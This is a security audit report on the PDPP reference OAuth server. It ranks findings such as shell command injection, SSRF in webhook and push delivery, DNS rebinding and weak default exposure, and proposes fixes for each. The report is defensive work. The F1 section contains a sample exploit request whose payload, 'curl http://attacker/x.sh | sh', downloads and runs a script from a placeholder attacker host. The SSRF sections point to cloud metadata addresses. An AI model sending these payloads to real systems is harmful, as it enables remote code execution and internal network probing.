# PDPP Reference Implementation — Deep Security Audit

- **Date:** 2026-07-03
- **Target:** `reference-implementation/` (server AS/RS, operations, runtime, stores)
- **Scope:** authn/authz boundaries, grant/scope enforcement, token & credential handling, secret leakage, injection (SQL/command/path/SSRF/proto-pollution), OAuth/DCR/PKCE correctness, redirect/origin validation, replay/CSRF, insecure defaults, privilege escalation.
- **Method:** manual data-flow tracing of the core AS (`server/auth.js`, 6.6k LOC), the owner-auth/CSRF/session trio, the RS read/mutation authz layer, and the record-query SQL substrate; plus four adversarial fan-out sub-audits (SQL/path/command injection, SSRF/outbound fetch, secret leakage, each cross-checked by hand). Findings below are labeled **CONFIRMED** (traced end-to-end by the author) or **SUSPECTED** (real gap, exploitability not fully proven in-session).
- **Constraint honored:** security code (owner-auth, CSRF, session, token issuance/introspection) is RED for behavior changes — this audit **diagnoses only**; no security code was modified. Proposed remediations are described, not applied.

---

## Executive summary

The reference implementation is, on the whole, **carefully built**. The token/grant/introspection core, the owner-auth placeholder (signed-cookie sessions + signed double-submit CSRF), credential-encryption-at-rest (AES-256-GCM + scrypt, fail-closed), and the SQL substrate (strict field allowlisting, parameterized queries, in-memory client filtering) all reflect real security engineering. SQL injection, path traversal, and prototype pollution surfaces came back **clean**. Secret leakage into logs/responses/diagnostics is **well-controlled** (env allowlist with redaction, non-secret spine payloads, fingerprint-not-plaintext credential surfaces).

The material findings cluster on **two themes**:

1. **A command string from an unauthenticated-in-default-posture endpoint reaches `spawn(cmd, {shell:true})`** — the single highest-severity issue (RCE), gated only by deployment posture.
2. **Server-side outbound fetches (webhook delivery, CIMD, web-push) lack destination-IP validation**, giving SSRF of varying reach.

Both themes intersect with a **third, structural** observation: the owner-exposure posture guard fails *closed* on clearly-hosted signals but leaves one residual open door — a deployment that binds all interfaces via the Node default (no explicit `bindHost`, no `NODE_ENV=production`, no public-origin env, no password) is classified `hosted=false` and boots with the owner control plane **open** (loud stderr warning, but not refused). That residual is what turns finding #1 from "local RCE" into "potential unauthenticated remote RCE."

### Ranked findings

| # | Severity | Confidence | Title |
|---|----------|-----------|-------|
| F1 | **Critical** (posture-dependent) / High baseline | CONFIRMED | Command injection: connector manifest `detect.command` → `spawn(..., {shell:true})` |
| F2 | **High** | CONFIRMED | SSRF via client event-subscription `callback_url` (no destination-IP check) |
| F3 | **Medium** | CONFIRMED (mechanism) / SUSPECTED (live exploit) | CIMD fetch DNS-rebinding TOCTOU (validate-then-fetch, no IP pin) |
| F4 | **Medium/Low** | CONFIRMED | Web-push subscription `endpoint` accepted with no URL/scheme/IP validation (self-SSRF) |
| F5 | **Medium/Low** | CONFIRMED | Owner-control-plane open on all-interfaces bind with default posture (warn, not refuse) |
| F6 | **Low** | CONFIRMED | `/introspect` endpoint unauthenticated (RFC 7662 deviation; mitigated by 256-bit token entropy) |
| F7 | **Low** | CONFIRMED | Uncontrolled `err.message` reflected to client on unexpected 500s |
| F8 | **Info** | CONFIRMED | Non-rotating OAuth refresh tokens; non-constant-time PKCE challenge compare |

---

## F1 — Command injection via connector manifest `detect.command` → `shell:true` spawn  **[Critical / CONFIRMED]**

**Sink.** `runtime/scheduler-readiness.ts:37-53`
```js
function runCommand(command, expectedExitCode) {
  return new Promise((resolve) => {
    const child = spawn(command, { shell: true, stdio: "ignore" });   // ← shell:true
    ...
```
Called from `runDetectCommand()` (`scheduler-readiness.ts:73-85`) for every `manifest.runtime_requirements.external_tools[].detect.command`, which is invoked by the scheduler's `defaultReadinessChecker` (`runtime/scheduler.ts:608,688`) as part of automatic run-readiness evaluation.

**Source.** The command string enters as connector-manifest content via `POST /connectors` → `registerConnector(manifest)`. The only validation applied is a non-emptiness check — `server/auth.js:2441-2445`:
```js
if (!isNonEmptyString(tool.detect.command)) {
  throw invalidConnectorManifest(`...detect.command must be a non-empty string`, code);
}
```
No shell-metacharacter denylist, no allowlist, no `{file,args[]}` structure requirement. Shell metacharacters (`;`, `` ` ``, `$()`, `&&`, `|`) survive to the `shell:true` spawn.

**Trust boundary.** `POST /connectors` is owner-gated **only when** `ownerExposurePosture.lockConnectorRegistry` is true (`server/routes/as-polyfill-connectors.ts:97-101`):
```ts
if (ctx.requireOwnerSessionForRegister) {
  app.post("/connectors", ctx.requireOwnerSessionForRegister, handler);
  return;
}
app.post("/connectors", handler);   // ← no auth on default/local-dev posture
```
`lockConnectorRegistry` is true only in a detected hosted posture (see F5). On the default/local-dev posture — and on the all-interfaces-bind residual of F5 — the endpoint is **unauthenticated**.

**Exploit.**
```
POST /connectors
{ "runtime_requirements": { "external_tools": [
    { "name":"x", "license":"x", "purpose":"x",
      "detect": { "command": "curl http://attacker/x.sh | sh" } } ] }, ... }
```
The scheduler's readiness check then runs `spawn("curl http://attacker/x.sh | sh", {shell:true})` → arbitrary command execution on the host, no further interaction required.

**Blast radius / mitigations.** No seed manifest (`connectors/seed/`, `manifests/`) uses `detect.command` — so a fix that requires structured `{file,args[]}` breaks no real connector. A safe sibling already exists: `runExecutable(file, args, ...)` (`scheduler-readiness.ts:55`) uses array-form `spawn(file, args, {})` with `shell` unset.

**Severity.** **Critical** in the exposed-misconfiguration posture (unauthenticated RCE). **High** as a baseline: even fully owner-gated, accepting shell strings for `shell:true` execution is a latent RCE reachable by the owner or by any XSS in the owner console; the manifest validator should never admit shell-destined strings.

**Remediation (diagnose-only; not applied).** Route `detect.command` through the existing array-form `runExecutable` path (require `{file, args[]}` in the manifest and spawn with `shell:false`). If a bare string must stay supported, validate at registration against a strict allowlist (executable name + safe flags, no shell metacharacters) *and* still spawn with `shell:false`. This is `runtime/` code, not the RED owner-auth security core; the fix is low-risk and behavior-preserving for all shipped connectors, but was left unapplied pending owner sign-off given its security sensitivity.

---

## F2 — SSRF via client event-subscription `callback_url`  **[High / CONFIRMED]**

**Chain.** `POST /v1/event-subscriptions` (`server/routes/rs-mutation.ts:585`, gated only by `ctx.requireToken` — **any** bearer client with an active grant, not owner-only) → `body.callback_url` (`rs-mutation.ts:600`) → `validateCallbackUrl()` → stored → delivery worker `fetch(url, ...)`.

**Validation gap.** `operations/as-client-event-subscriptions/index.ts:136-155`:
```ts
const ALLOWED_LOCAL_HOSTS = new Set(["localhost","127.0.0.1","[::1]","::1"]);
function validateCallbackUrl(raw) {
  ... if (parsed.protocol === "https:") return parsed;          // any https host accepted
  if (parsed.protocol === "http:" && ALLOWED_LOCAL_HOSTS.has(parsed.hostname.toLowerCase())) return parsed;
  throw ...;
}
```
Scheme is checked; **destination IP is not**. `https://169.254.169.254/...` (cloud metadata), `https://10.x/...`, `https://internal-svc.corp/...` all pass. The delivery transport (`server/client-event-delivery-worker.ts:42-45`) uses default `fetch` (`redirect:'follow'` — so even an allowed public HTTPS callback can 302 → `http://169.254.169.254`), re-attempted on a recurring timer.

**Impact.** Any low-privilege bearer client turns the server into a recurring, server-signed request cannon against internal-network targets. Response **bodies** are captured but only surfaced on `requireOwnerSession` routes — so this is **blind** from the attacker's side, but the attacker-visible subscription-get exposes `status_code` per attempt (`operations/ref-client-event-subscriptions-get/index.ts:138`), giving a status/timing oracle plus real side-effecting reach into internal HTTP services.

**Severity.** **High** — low bar (any grant), persistent delivery, cloud-metadata reachable via redirect, oracle channel.

**Remediation.** After the scheme check, resolve the hostname and reject any resolved address in loopback/RFC1918/CGNAT/link-local/multicast/metadata ranges (the codebase already implements exactly this in `server/cimd.js`'s `isForbiddenIp`). Re-validate on **each** delivery (long-lived webhook → DNS-rebinding matters) and pin the connection to the validated IP. Set `redirect:'error'` (or manual) on the delivery fetch.

---

## F3 — CIMD fetch DNS-rebinding TOCTOU  **[Medium / CONFIRMED mechanism, SUSPECTED live exploit]**

**Location.** `server/cimd.js:256-286` — `fetchCimdDocument()` validates then fetches:
```js
addrs = await dnsLookupImpl(url.hostname, { all: true });   // resolution #1 (checked)
for (const addr of addrs) if (isForbiddenIp(addr.address)) throw ...;
response = await fetchImpl(clientId, { redirect: 'manual', ... });   // resolution #2 (fresh, unpinned)
```
The IP-safety check (resolution #1) and the actual connection (resolution #2, inside Node's `fetch`/undici) are **independent DNS resolutions with no IP pinning between them**. A rebinding-capable authoritative server (low/zero TTL) can answer #1 with a public IP (passes) and #2 with `169.254.169.254`/`127.0.0.1`. Reached pre-authentication via a `client_id=https://…` in an OAuth/PAR flow.

**Why only Medium.** This file has the *strongest* SSRF engineering in the codebase — comprehensive `isForbiddenIp` blocklist (incl. IPv4-mapped/6to4-embedded), `redirect:'manual'`, 5 s timeout, response body cap, redirect_uri same-origin pinning. Only the rebinding window is missing. Exploitability depends on winning a DNS race against undici's resolver; **CONFIRMED** by reading that no pinning exists, **SUSPECTED** as to a working live PoC (not run in-session).

**Remediation.** Resolve once, validate, then connect to the pre-validated IP (undici `Agent` with a `connect.lookup` override returning only the validated address, preserving hostname for SNI/Host), rather than letting `fetch` re-resolve.

---

## F4 — Web-push subscription `endpoint` unvalidated  **[Medium/Low / CONFIRMED]**

**Location.** `server/web-push-notifications.js:42-53` — `normalizeSubscription()` accepts any non-empty string as `endpoint`; no URL parse, scheme, or IP check. Later `webPush.sendNotification(subscription, ...)` (`:515-523`) POSTs a VAPID-signed body to it. Route `POST /_ref/web-push/subscriptions` is `requireOwnerSession`-gated (`server/routes/web-push.ts:117`).

**Impact.** Owner-session-gated → primarily a **self-SSRF** primitive (owner attacking own server), which is low standalone value — but becomes exploitable when chained with an owner-console XSS or in any deployment where "owner" is not fully trusted. Cheap to fix, so worth closing.

**Remediation.** Parse `endpoint`, require `https:`, allowlist known push services (FCM/Mozilla/Apple) or apply the `isForbiddenIp` DNS/IP check, re-checked at send time.

---

## F5 — Owner control plane open on all-interfaces bind (default posture)  **[Medium/Low / CONFIRMED]**

The owner-exposure posture guard (`server/owner-exposure-posture.ts`) is genuinely good defense-in-depth: it **refuses to boot** on a hosted signal (`NODE_ENV=production`, non-loopback `AS_PUBLIC_URL`/`PDPP_REFERENCE_ORIGIN`/`asPublicUrl`, explicit non-loopback `bindHost`, or `PDPP_HOSTED=1`) when no owner password is set (`index.js:4952-4956`).

**Residual.** An *explicit* non-loopback `bindHost` is a hosted signal, but an **undefined** `bindHost` (Node default → binds *all* interfaces, the most-exposed bind) is deliberately **not** counted (`owner-exposure-posture.ts:200-206`, comment: "must not, on its own, force hosted mode"). So a deployment that: binds all interfaces via the default, sets no public-origin env, is not `NODE_ENV=production`, and has no password → `hosted=false` → **boots with the owner control plane open** (connection delete/revoke, deployment diagnostics, scheduler, manual runs, **and the F1 connector registry**). A loud `logger.warn` fires (`index.js:4964-4967`) but boot is not refused.

**Severity.** Medium/Low — requires a specific (but plausible) misconfiguration; there is a warning; it's a conscious LAN-demo-convenience tradeoff. It is, however, the amplifier that makes F1 potentially unauthenticated-remote. **Confirmed** by data-flow: `isLoopbackBindHost(undefined) === false` → `bindsNonLoopback=true`, but the hosted-signal push is guarded by `inputs.bindHost != null`.

**Remediation (policy).** Consider treating undefined `bindHost` as hosted-signal *unless* an explicit loopback bind or explicit `PDPP_ALLOW_UNAUTHENTICATED_OWNER=1` is set — i.e. fail closed by default, opt into the LAN demo. At minimum, escalate the warn to a refuse when the connector registry (F1 sink) is reachable unauthenticated.

---

## F6 — `/introspect` endpoint unauthenticated  **[Low / CONFIRMED]**

`POST /introspect` (`server/routes/as-oauth.ts:402`) has no auth middleware. RFC 7662 §2.1 requires the introspection endpoint be protected to prevent token-scanning. Here anyone presenting a token string can introspect it, and inactive responses for a *presented* revoked/expired token echo `grant_id`/`client_id`/`subject_id`/`trace_id` (`server/auth.js:6388-6435`). **Mitigation:** tokens are 256-bit (`randomBytes(32).hex`), so scanning is infeasible, and you must already hold the token to learn anything. Low risk; note as an RFC deviation. **Remediation:** require client authentication (or at least a valid bearer) on `/introspect`.

---

## F7 — Uncontrolled `err.message` reflected on unexpected 500s  **[Low / CONFIRMED]**

`server/index.js:760-772` — `handleError` sends `err.message` to the client with a mapped status. For typed PDPP errors that copy is intentional. But an *unexpected* throw (no `.code` → `api_error`/500) reflects the raw `err.message`, which for a DB/driver/fs exception could leak an internal path, a table name, or a driver error string. No stack trace leaks (only `.message`). **Remediation:** for the `api_error`/500 fallback, return a generic message and log the detail server-side under the request id.

---

## F8 — Informational / by-design notes

- **Non-rotating OAuth refresh tokens.** `exchangeOAuthRefreshToken` (`auth.js:5673-5740`) returns the *same* `refresh_token` (no rotation/one-time-use). Refresh tokens are stored hashed (SHA-256), client-bound, and expiry/revocation-checked. Non-rotation is a defensible design choice but forgoes stolen-refresh-token detection; consider rotation + reuse-detection if these become long-lived on untrusted clients.
- **Non-constant-time PKCE compare.** `exchangeOAuthAuthorizationCode` (`auth.js:5625`) compares `base64UrlSha256(codeVerifier) !== row.code_challenge` with `!==`. The compared value is a hash of a secret the caller already supplied, so timing leakage is of marginal value; note for completeness. (Session and CSRF token compares *do* use `crypto.timingSafeEqual` — good.)
- **24-bit `user_code`.** `randomBytes(3).hex.toUpperCase()` (`auth.js:3209` etc.). Acceptable: every device/consent approval route is `requireOwnerSession` + `requireCsrf` gated (`as-device-ui.ts:290-300`, `as-consent.ts:568-569`), so `user_code` is a *display selector*, not a bearer capability. `device_code` (the actual capability where used) is 64-bit (`generateId('dc')`).

---

## What was verified and ruled out (coverage, not just findings)

**Authn/authz & grant scope — solid.**
- `requireToken` (`index.js:1147`) gates every RS route via `introspect()`, which re-validates grant-active *and* re-checks the persisted grant contract against the *current* manifest on every call (`auth.js:6438-6521`) — closes grant-widening-after-manifest-change.
- Stream-level scope is enforced at every read entry point in `records.js` (`grant.streams.find(s => s.name === stream)` → "not in grant"; lines 2121, 2611, 2777, 2878) — enforcement lives in the substrate, not the (thin) HTTP route.
- Field-level scope enforced (`field_not_granted`) on views, filters, and aggregates (`records.js:1056-1058, 2150-2154`; `record-filters.js:100-102`).
- `approveGrant` re-validates client registration + bindings + manifest contract **at approval time**, not just initiation (`auth.js:4012-4023`) — closes TOCTOU widening between PAR staging and approval.
- Mutation routes gated `requireToken` + `requireOwner`/`requireClient`; ingest is owner-only (`rs-mutation.ts:949`). Package tokens can't reach REST (`requireClientOrMcpPackage`, `index.js:1231`).

**SQL injection — clean.** Values always bound (`$n`/`?`); dynamic identifiers gated by `SAFE_JSON_FIELD = /^[A-Za-z_][A-Za-z_0-9]*$/` (`record-expand-helpers.js:96`) and sourced from manifests, not requests; ORDER BY is a manifest allowlist; client filters are applied **in-memory** via JS property access (`record-filters.js:165`), never spliced into SQL; DDL identifiers appear only at boot.

**Path traversal — clean.** Blobs are DB-backed content-addressed (no fs path from `blob_id`); no `express.static`/`sendFile`; the manual-upload path double-gates `connector_id` (registry + `safePathSegment`) and `file_name` (rejects `/`,`\`,`.`,`..`); `hosted-ui.css` is a fixed static path.

**Prototype pollution — clean.** No generic deep-merge/path-assign util; records stored as opaque JSON; explicit `__proto__`/`constructor`/`prototype` denylists on stream names (`owner-connection-run.ts:340`, `ref-connectors.ts:606`, `controller.ts:2819`); dynamic-key assignments target fresh local literals.

**Credential handling — clean.** `credential-encryption.js`: AES-256-GCM, per-seal random salt+IV, scrypt KDF (N=16384), authenticated decrypt, **fail-closed** when no operator key, no plaintext/key ever logged or returned, constant-time fingerprint compare. `ref-static-secret-credentials.ts` returns only `credential_kind` + `fingerprint`, never plaintext. Owner-session KDF uses scrypt (upgraded from single-round SHA-256).

**Secret leakage — clean.** `deployment-diagnostics.ts` uses an env **allowlist** with `secret:true` flags + `SECRET_NAME_RE`; secret values are redacted to `null`/`provenance:"redacted"` (`PDPP_OWNER_PASSWORD`, `*_CLIENT_SECRET`, `PDPP_DCR_INITIAL_ACCESS_TOKENS`). `owner-connection-diagnostics.ts` documents and emits non-secret payloads only. Spine-event `data:` payloads carry `source`/`client_id`/`user_code` — no raw bearer tokens, refresh tokens, credentials, or passwords.

**OAuth/DCR/PKCE/redirect — solid.** DCR: strict field allowlist, no `client_secret` accepted, `redirect_uris` require https (or loopback-http for native), `issuer_subject_id` sourced from owner session **not** request body (`auth.js:2287-2299`). PKCE: S256 only, verifier regex `^[A-Za-z0-9._~-]{43,128}$`, challenge bound to code, code single-use (`consumeCode` change-count guard). Auth-code exchange checks client_id + redirect_uri + expiry + single-use. `sanitizeReturnTo` (owner-auth) blocks open-redirect (`//`, `\`, control chars, non-`/`-prefixed). Clickjacking headers (`X-Frame-Options: DENY`, `CSP frame-ancestors 'none'`) set on all AS responses.

**CSRF/session — solid.** Signed double-submit CSRF (HMAC over random nonce, HttpOnly cookie + hidden field, constant-time compare, rotated on auth-state change), `text/plain` bypass explicitly closed, JSON exemption justified by CORS-preflight. Session cookie is HMAC-signed (scrypt-derived key), HttpOnly, SameSite, `Secure` on https, expiry-checked.

**Ruled-out SSRF.** DCR client-metadata URIs (`logo_uri`/`client_uri`/`policy_uri`/`tos_uri`/`jwks_uri`) are **stored but never fetched** (grep-verified). Google data-portability provider-auth uses hardcoded Google endpoints + env-pinned redirect. Source-webhook ingest is inbound-only. The n.eko browser proxy has a host allowlist + approval gate.

---

## Methodology notes & confidence

- The AS core (`auth.js`), owner-auth/CSRF/session, RS read/mutation authz, and the record SQL substrate were read directly by the author and traced end-to-end.
- Four adversarial fan-out sub-audits (SQL/path/command injection; SSRF; secret leakage) ran in parallel; **every finding they surfaced was independently re-verified by the author against source** before inclusion (F1 sink read at `scheduler-readiness.ts:39`; F2 validator + worker read; F3 double-resolution read at `cimd.js:264/282`; F4 `normalizeSubscription` read; diagnostics/spine leakage spot-checked).
- **Not exercised at runtime** (static analysis only): live DNS-rebinding PoC for F3; actual RCE detonation for F1; undici redirect/resolver behavior specifics. These are the SUSPECTED-labeled edges.
- Deferred/lower-priority surfaces not exhaustively covered: full read of every one of the ~55 route files; the streaming/neko allocator internals beyond the allowlist check; the CLI/MCP-server published packages (out of the server trust boundary).

## Recommended remediation order

1. **F1** (Critical) — eliminate `shell:true` for `detect.command`; require `{file,args[]}` + `shell:false`. Highest impact, no shipped-connector breakage.
2. **F2** (High) — add `isForbiddenIp` DNS/IP check to `callback_url` at registration and per-delivery; disable redirects.
3. **F5** (Medium/Low, policy) — fail closed on all-interfaces bind by default; require explicit opt-in for unauthenticated owner.
4. **F3 / F4** (Medium) — IP-pin CIMD; validate web-push endpoints.
5. **F6 / F7** (Low) — authenticate `/introspect`; generic 500 message.
